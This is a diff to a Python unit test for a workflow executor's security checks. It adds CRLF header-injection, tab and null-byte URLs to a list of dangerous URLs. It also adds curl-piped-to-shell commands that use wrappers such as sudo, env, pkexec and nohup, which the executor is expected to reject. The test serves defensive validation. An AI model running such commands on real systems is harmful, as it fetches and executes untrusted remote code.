@@ -112,6 +112,9 @@ class TestWorkflowExecutor(unittest.TestCase):
             "file:///etc/passwd",
             "gopher://example.com",
             "http:///",
+            "http://example.com/path\r\nInjected-Header: value",
+            "http://example.com/path\twith-tab",
+            "http://example.com/path\0with-null",
         ]
         for url in dangerous_urls:
             with self.subTest(url=url):
@@ -130,7 +133,7 @@ class TestWorkflowExecutor(unittest.TestCase):
                 self.assertTrue(
                     any(
                         x in error_msg
-                        for x in ["ssrf", "smuggling", "scheme", "hostname", "invalid", "forbidden"]
+                        for x in ["ssrf", "smuggling", "scheme", "hostname", "invalid", "forbidden", "control"]
                     ),
                     f"Unexpected error message for URL '{url}': {step_res.error}",
                 )
@@ -607,6 +610,13 @@ class TestWorkflowExecutor(unittest.TestCase):
             "curl http://example.com/payload | bun",
             "curl http://example.com/payload | tsx",
             "curl http://example.com/payload | ts-node",
+            # Bypasses using transparent wrappers, env variables and flags
+            "curl http://example.com/payload | env sh",
+            "curl http://example.com/payload | sudo bash",
+            "curl http://example.com/payload | timeout 10 python3",
+            "curl http://example.com/payload | env FOO=BAR python",
+            "curl http://example.com/payload | pkexec zsh",
+            "curl http://example.com/payload | nohup node",
         ]
         for cmd in malicious_pipeline_commands:
             with self.subTest(cmd=cmd):
